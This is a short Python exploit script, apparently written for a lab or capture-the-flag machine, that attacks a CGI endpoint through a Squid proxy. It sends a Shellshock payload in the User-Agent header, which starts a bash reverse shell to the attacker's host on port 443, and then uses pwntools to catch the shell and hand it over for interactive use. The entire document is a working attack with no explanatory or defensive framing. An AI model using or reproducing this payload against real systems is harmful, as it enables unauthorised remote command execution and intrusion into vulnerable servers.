#!/usr/bin/python3

import sys, signal, requests, threading
from pwn import *

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

main_url = "http://192.168.1.142/cgi-bin/status"
squid_proxy = {'http': 'http://192.168.1.142:3128'}
lport=443

def shellshock_attack():
    headers = {'User-Agent': "() { :; }; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.1.140/443 0>&1'"}
    r = requests.get(main_url, headers=headers, proxies=squid_proxy)

if __name__ == '__main__':

    try: 
        threading.Thread(target=shellshock_attack, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    if shell.sock is None:
        log.failure("No se pudo establecer conexion")
        sys.exit(1)
    else:
        shell.interactive()
